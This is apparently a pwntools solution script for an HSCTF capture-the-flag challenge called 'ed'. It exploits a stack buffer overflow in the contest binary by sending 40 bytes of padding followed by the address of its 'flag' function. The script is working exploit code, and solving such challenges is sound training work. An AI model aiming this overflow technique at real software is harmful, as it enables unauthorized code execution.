#!/usr/bin/env python3
from pwn import *

e = ELF("./ed")
p = remote("ed.hsctf.com", 1337)
#p = process("./ed")
flag = e.symbols["flag"]
p.sendline(b"A" * 40 + p64(flag))
p.sendlineafter(b"?\n", b"Q")
print(p.recvall().decode().strip())
